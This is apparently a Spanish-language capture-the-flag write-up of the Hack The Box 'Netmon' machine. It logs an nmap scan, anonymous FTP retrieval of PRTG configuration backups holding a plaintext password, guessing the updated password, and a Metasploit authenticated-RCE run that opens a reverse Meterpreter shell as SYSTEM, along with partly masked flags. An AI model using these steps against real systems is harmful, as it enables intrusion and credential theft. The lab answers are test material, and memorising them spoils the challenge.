---
title: Netmon
date: 2025-12-11 18:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, netmon ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/3fa8184483e279369b81becafbac9dee.png
    alt: Hack The Box
---

> Netmon
Windows · Easy 

## Task 1

What is the name of the application running on port 80? Given the three words in the logo.

``` shell
┌┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- -sCVS -T 5 --min-rate 1000 10.129.11.228 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-11 18:54 CET
Warning: 10.129.11.228 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.11.228
Host is up (0.042s latency).
Not shown: 63217 closed tcp ports (reset), 2305 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_11-10-23  09:20AM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-server-header: PRTG/18.1.37.13946
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-12-11T17:56:42
|_  start_date: 2025-12-11T17:52:44
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.91 seconds

```

> PRTG Network Monitor

## Task 2

What service is running on TCP port 21?

> ftp 

## Submit the flag located on the Public user's desktop.

Vamos a entrar al FTP a ver que podemos encontrar puesto que según el escaneo de nmap, hay la posibilidad de usar el usuario
anonymous

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ ftp 10.129.11.228
Connected to 10.129.11.228.
220 Microsoft FTP Service
Name (10.129.11.228:pmartinezr): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49983|)
150 Opening ASCII mode data connection.
02-02-19  11:18PM                 1024 .rnd
02-25-19  09:15PM       <DIR>          inetpub
07-16-16  08:18AM       <DIR>          PerfLogs
02-25-19  09:56PM       <DIR>          Program Files
02-02-19  11:28PM       <DIR>          Program Files (x86)
02-03-19  07:08AM       <DIR>          Users
11-10-23  09:20AM       <DIR>          Windows
226 Transfer complete.
ftp> cd inetpub
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49989|)
150 Opening ASCII mode data connection.
02-25-19  07:07AM       <DIR>          ftproot
02-25-19  09:15PM       <DIR>          logs
02-25-19  09:15PM       <DIR>          temp
02-25-19  09:15PM       <DIR>          wwwroot
ftp> cd wwwroot
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49990|)
150 Opening ASCII mode data connection.
226 Transfer complete.
```

Si exploramos por los directorios del FTP podemos encontrar archivos relacionados con la aplicaicón ```PRTG Configuration.dat```

``` shell
ftp> dir
229 Entering Extended Passive Mode (|||50319|)
125 Data connection already open; Transfer starting.
02-02-19  11:18PM                 1195 PRTG Enterprise Console.lnk
02-02-19  11:18PM                 1160 PRTG Network Monitor.lnk
12-11-25  12:53PM                   34 user.txt
226 Transfer complete.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||50321|)
150 Opening ASCII mode data connection.
100% |********************************************************************************|    34        0.85 KiB/s    00:00 ETA
226 Transfer complete.
34 bytes received in 00:00 (0.84 KiB/s)
``` 

Incluso podemos conseguir una de las flags del fichero users.txt ```e14c99d9a2c89f04************```

> e14c99d9a2c89f04************


## Task 4

What is the full path of the folder where PRTG Network Monitor saves its configuration files by default? 

``` shell
ftp> get "PRTG Configuration.dat"
local: PRTG Configuration.dat remote: PRTG Configuration.dat
229 Entering Extended Passive Mode (|||50651|)
150 Opening ASCII mode data connection.
100% |********************************************************************************|  1161 KiB    1.98 MiB/s    00:00 ETA
226 Transfer complete.
1189697 bytes received in 00:00 (1.98 MiB/s)
ftp> get "PRTG Configuration.old"
local: PRTG Configuration.old remote: PRTG Configuration.old
229 Entering Extended Passive Mode (|||50657|)
150 Opening ASCII mode data connection.
100% |********************************************************************************|  1161 KiB    1.96 MiB/s    00:00 ETA
226 Transfer complete.
1189697 bytes received in 00:00 (1.96 MiB/s)
ftp> get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
229 Entering Extended Passive Mode (|||50658|)
150 Opening ASCII mode data connection.
100% |********************************************************************************|  1126 KiB    1.71 MiB/s    00:00 ETA
226 Transfer complete.
```

Finalmente encuentro algo en uno de los directorios ocultos de Windows ```C:\ProgramData```, este directorio contiene
la configuración de las cuentas del sistema y Windowds lo oculta para evitar modificaciones accidentales y evitar problemas. 

``` shell
            <dbpassword>
	      <!-- User: prtgadmin -->
	      PrTg@dmin2018
            </dbpassword>
```

En el fichero ```PRTG Configuration.old.bak```econtramos unas credenciales que inmediatamente me dicen que tengo que probar en la web

``` html
PRTG Network Monitor (NETMON)

Your login has failed. Please try again!
```

Vaya, esas credenciales de la base de datos no funcionan en la web 

``` shell
ftp> pwd
Remote directory: /ProgramData/Paessler/PRTG Network Monitor
ftp> dir
229 Entering Extended Passive Mode (|||51101|)
150 Opening ASCII mode data connection.
12-11-25  01:35PM       <DIR>          Configuration Auto-Backups
12-11-25  01:03PM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
12-11-25  01:03PM       <DIR>          Logs (Web Server)
12-11-25  01:03PM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
02-25-19  09:54PM              1189697 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
12-11-25  02:16PM              1697180 PRTG Graph Data Cache.dat
02-25-19  10:00PM       <DIR>          Report PDFs
02-02-19  11:18PM       <DIR>          System Information Database
02-02-19  11:40PM       <DIR>          Ticket Database
02-02-19  11:18PM       <DIR>          ToDo Database
226 Transfer complete.
```

> c:\ProgramData\Paessler\PRTG Network Monitor


## Task 5

What is the name of the backup config file?

> PRTG Configuration.old.bak

## Task 6

What was the sy user's password according to that file?

> PrTg@dmin2018

## Task 7

What is the prtgadmin user's password on the website now?

Atendiendo a que la password ya nos da la idea de que va mutando año a año usando el propio año (yo no recomendaría hacer esto)
Entonces pruebo con ```PrTg@dmin2019```y consigo entra al sitio

``` html
Welcome PRTG System Administrator!
``` 

> PrTg@dmin2019


## Task 8

What version of PRTG is installed?

En la web podemos ver la versión en el pie de la página.

> 18.1.37.13946 


## Task 9 

Which user is this software running as by default? Don't include anything before a \.
``` shell
msf exploit(windows/http/prtg_authenticated_rce) > run
[*] Started reverse TCP handler on 10.10.15.224:4442 
[-] Exploit aborted due to failure: no-access: Failed to authenticate to the web interface
[*] Exploit completed, but no session was created.
msf exploit(windows/http/prtg_authenticated_rce) > set rhosts 10.129.12.20
rhosts => 10.129.12.20
msf exploit(windows/http/prtg_authenticated_rce) > run
[*] Started reverse TCP handler on 10.10.15.224:4442 
[+] Successfully logged in with provided credentials
[+] Created malicious notification (objid=2018)
[+] Triggered malicious notification
[+] Deleted malicious notification
[*] Waiting for payload execution.. (30 sec. max)
[*] Sending stage (188998 bytes) to 10.129.12.20
[*] Meterpreter session 2 opened (10.10.15.224:4442 -> 10.129.12.20:49679) at 2025-12-11 21:31:12 +0100

meterpreter > shell

c:\ProgramData\Paessler\PRTG Network Monitor>whoami
whoami
nt authority\system
```
Ahora con las credenciales válidas podemos usar el siguiente exploit en metasploit y conseguir meterpreter con el usuario ```nt authority\system```

> system

## Submit the flag located on the administrator's desktop.

``` shell
c:\Users\Administrator\Desktop>type root.txt
type root.txt
6a876a49a27d89095************
```

> 6a876a49a27d89095************

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/177)